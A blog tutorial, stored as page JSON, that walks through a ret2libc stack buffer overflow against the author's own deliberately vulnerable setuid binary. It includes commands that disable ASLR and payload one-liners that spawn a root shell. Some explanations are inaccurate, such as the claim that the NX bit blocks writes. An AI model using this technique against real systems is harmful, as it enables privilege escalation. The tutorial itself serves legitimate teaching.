{"pageProps":{"allTags":{"biohacking":"biohacking","buffer-overflow":"buffer overflow","development":"Development","dll-injection":"DLL Injection","domains":"domains","ee":"EE","example":"example","how-to":"how to","makefile":"Makefile","memory":"memory","pcap":"pcap","phishing":"phishing","re":"RE","research":"research","rfid":"RFID","story":"Story","windows-api":"Windows API","windows-hacking":"Windows Hacking"},"title":"Exploiting a Stack Buffer Overflow (ret2libc method)","slug":"stack-exploitation","date_published":1547813100000,"date_updated":1547814692000,"tags":["research","memory","how to","buffer overflow"],"excerpt":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include <string.h>\n    #include <unistd.h>\n    #include <sys/cdefs.h>\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc > 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 > /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gef➤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    End of assembler dump.\n    @gef➤  q\n    \n\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `<main+39>` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc >) {...}` condition.\n\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 => /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q bin/sof\n    \n    @gef➤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gef➤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gef➤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gef➤  p system\n    $1 = {<text variable, no debug info>} 0xf7e2c540 <__libc_system>\n    \n    @gef➤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gef➤  p exit\n    $2 = {<text variable, no debug info>} 0xf7e1e8f0 <__GI_exit>\n    \n    @gef➤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n","cover":"2019/01/gef.jpg","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"<p>A stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.</p>\n<p>In this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the <code>system</code> and <code>exit</code> sys calls for demonstration.</p>\n<p>To have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching <a href=\"https://www.youtube.com/watch?v=7dLZRMDcY6c\">stack</a> and <a href=\"https://www.youtube.com/watch?v=XbZQ-EonR_I\">call stack</a>.</p>\n<h2>Creating a vulnerable binary to test on</h2>\n<p>To practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.</p>\n<pre><code>#include &#x3C;string.h>\n#include &#x3C;unistd.h>\n#include &#x3C;sys/cdefs.h>\n\nint main(int argc, char** argv) {\n\n    setuid(0);\n\n    if (argc > 1) {\n        char buf[256];\n        strcpy(buf, argv[1]);\n    }\n\n    return 0;\n}\n</code></pre>\n<p>For the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.</p>\n<p><code>gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c</code></p>\n<ul>\n<li><code>-g</code>: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.</li>\n<li><code>-fno-stack-protector</code>: Disables stack smashing protectors (SSP).</li>\n<li><code>-z execstack</code>: Makes stack frames executable.</li>\n<li><code>-o sof</code>: Output (compiled) binary name will be sof.</li>\n<li><code>-mpreferred-stack-boundary=2</code>: aligns the stack boundary in our binary to 4 bytes.</li>\n</ul>\n<p>ASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding <code>kernel.randomize_va_space = 0</code> to <code>/etc/sysctl.conf</code> or <code>echo 0 > /proc/sys/kernel/randomize_va_space</code>. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to <code>cat /proc/sys/kernel/randomize_va_space</code>. If the output is a positive number, it's enabled.</p>\n<h2>Assembler dump breakdown</h2>\n<p>Let's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒  gdb -q   bin/sof                                              \n[*] No debugging session active\nGEF for linux ready, type `gef' to start, `gef config' to configure\n67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\nReading symbols from bin/sof...done.\n@gef➤  disassemble main\nDump of assembler code for function main:\n   0x08048416 &#x3C;+0>: push   ebp\n   0x08048417 &#x3C;+1>: mov    ebp,esp\n   0x08048419 &#x3C;+3>: sub    esp,0x100\n   0x0804841f &#x3C;+9>: push   0x0\n   0x08048421 &#x3C;+11>:    call   0x8048300 &#x3C;setuid@plt>\n   0x08048426 &#x3C;+16>:    add    esp,0x4\n   0x08048429 &#x3C;+19>:    cmp    DWORD PTR [ebp+0x8],0x1\n   0x0804842d &#x3C;+23>:    jle    0x8048447 &#x3C;main+49>\n   0x0804842f &#x3C;+25>:    mov    eax,DWORD PTR [ebp+0xc]\n   0x08048432 &#x3C;+28>:    add    eax,0x4\n   0x08048435 &#x3C;+31>:    mov    eax,DWORD PTR [eax]\n   0x08048437 &#x3C;+33>:    push   eax\n   0x08048438 &#x3C;+34>:    lea    eax,[ebp-0x100]\n   0x0804843e &#x3C;+40>:    push   eax\n   0x0804843f &#x3C;+41>:    call   0x80482e0 &#x3C;strcpy@plt>\n   0x08048444 &#x3C;+46>:    add    esp,0x8\n   0x08048447 &#x3C;+49>:    mov    eax,0x0\n   0x0804844c &#x3C;+54>:    leave  \n   0x0804844d &#x3C;+55>:    ret    \nEnd of assembler dump.\n@gef➤  q\n\n\n   0x08048416 &#x3C;+0>: push   ebp\n   0x08048417 &#x3C;+1>: mov    ebp,esp\n   0x08048419 &#x3C;+3>: sub    esp,0x100\n</code></pre>\n<p>These first few lines above are called a function prologue. <code>push ebp</code> pushes our base pointer onto the stack. Then <code>mov ebp,esp</code> copies the value of <code>esp</code> (stack pointer) into the <code>ebp</code> register making <code>ebp</code> == <code>esp</code>. Next, <code>sub esp,0x100</code> moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for <code>char buf[256]</code>.</p>\n<pre><code>   0x0804841f &#x3C;+9>: push   0x0\n   0x08048421 &#x3C;+11>:    call   0x8048300 &#x3C;setuid@plt>\n</code></pre>\n<p>Push 0 onto the stack as an argument for the call to <code>setuid()</code>.</p>\n<pre><code>   0x08048426 &#x3C;+16>:    add    esp,0x4\n   0x08048429 &#x3C;+19>:    cmp    DWORD PTR [ebp+0x8],0x1\n   0x0804842d &#x3C;+23>:    jle    0x8048447 &#x3C;main+49>\n</code></pre>\n<p>The next instruction <code>cmp DWORD PTR [ebp+0x8],0x1</code> compares the first argument of main (argc) to 1. The following <code>jle</code> instruction uses the result of this comparison. It takes the result and jumps to <code>&#x3C;main+39></code> if the result is less than or equal to the value stored at <code>0x8048412</code>, which is 1. If you look at the C source above, you can see this is essentially our <code>if (argc >) {...}</code> condition.</p>\n<pre><code>   0x0804842f &#x3C;+25>:    mov    eax,DWORD PTR [ebp+0xc]\n   0x08048432 &#x3C;+28>:    add    eax,0x4\n   0x08048435 &#x3C;+31>:    mov    eax,DWORD PTR [eax]\n   0x08048437 &#x3C;+33>:    push   eax\n</code></pre>\n<p>Here, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of <code>argv[1]</code>. Next, <code>mov eax,DWORD PTR [eax]</code> takes the value at <code>argv[1]</code> and copies it into the <code>eax</code> register. <code>push eax</code> pushes this value onto the stack.</p>\n<pre><code>   0x08048438 &#x3C;+34>:    lea    eax,[ebp-0x100]\n   0x0804843e &#x3C;+40>:    push   eax\n</code></pre>\n<p><code>lea eax,[ebp-0x100]</code> calculates the address of <code>ebp-0x100</code> and stores the address in <code>eax</code>. <code>push eax</code> pushes this address onto the stack.</p>\n<pre><code>   0x0804843f &#x3C;+41>:    call   0x80482e0 &#x3C;strcpy@plt>\n</code></pre>\n<p>The <code>call</code> instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to <code>strcpy@plt</code>. The reason a return address is pushed onto the stack is so that when <code>strcpy@plt</code> finishes executing, the program knows where to return execution.</p>\n<pre><code>   0x08048444 &#x3C;+46>:    add    esp,0x8\n   0x08048447 &#x3C;+49>:    mov    eax,0x0\n   0x0804844c &#x3C;+54>:    leave  \n   0x0804844d &#x3C;+55>:    ret    \n</code></pre>\n<p>These last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. <code>add esp,0x8</code> adds 8 bytes to the address <code>esp</code> points to. Then <code>mov eax,0x0</code> zeros out whatever is stored in the <code>eax</code> register. The <code>leave</code> instruction does a couple of things. It releases the stack frame and then copies the base pointer (<code>ebp</code>) into <code>esp</code>. This releases the space that was allocated to the previous stack frame. Finally, the <code>ret</code> instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.</p>\n<h1>Exploiting the SOF vulnerability</h1>\n<p>Now that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒  bin/sof $(perl -e 'print \"A\" x 260')\n[1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n</code></pre>\n<p>When we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.</p>\n<h2>Creating the payload</h2>\n<p>In order to successfully call <code>system</code>, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.</p>\n<p>To get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.</p>\n<p>To see the absolute path to the libc.so library that our binary uses, we use <code>ldd</code>. This is needed for the next step.</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  ldd bin/sof\n    linux-gate.so.1 (0xf7fd2000)\n    libc.so.6 => /lib/libc.so.6 (0xf7deb000)\n    /lib/ld-linux.so.2 (0xf7fd4000)\n</code></pre>\n<p>Next, we use <code>strings</code> to report the offset of any string it finds in libc.so and grep the output for what we're after.</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n 16a23e /bin/sh\n</code></pre>\n<p>Running <code>vmmap</code> will also provide the starting address of libc.so when ran from a active gdb session.</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒  gdb -q bin/sof\n\n@gef➤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n0xf7fa8000 0xf7fab000 0x00000000 rwx \n0xf7fcd000 0xf7fcf000 0x00000000 rwx \n0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n0xfffda000 0xffffe000 0x00000000 rwx [stack]\n\n@gef➤  q\n</code></pre>\n<p>We calculate the address by taking the start address of <code>/usr/lib/libc-2.26.so</code> and add the offset of the string. I like to use <code>printf</code> for this. If you use printf in gdb, you have to add <code>shell</code> before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n0xf7f5523e\n</code></pre>\n<p>To verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.</p>\n<pre><code>@gef➤  x/s 0xf7f5523e\n0xf7f5523e: \"/bin/sh\"\n</code></pre>\n<p>And now, we just need the address of <code>system</code>.</p>\n<pre><code>@gef➤  p system\n$1 = {&#x3C;text variable, no debug info>} 0xf7e2c540 &#x3C;__libc_system>\n\n@gef➤  q\n</code></pre>\n<p>Because I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this <a href=\"https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea\">script</a> that takes a memory address and reverses it.</p>\n<p>Reverse system address</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  raddr -a 0xf7e2c540\n\\x40\\xc5\\xe2\\xf7\n</code></pre>\n<p>Reverse \"/bin/sh\" string address</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  raddr -a 0xf7f5523e\n\\x3e\\x52\\xf5\\xf7\n</code></pre>\n<p>And for the return address, we can use anything for the time being.</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒   raddr -a 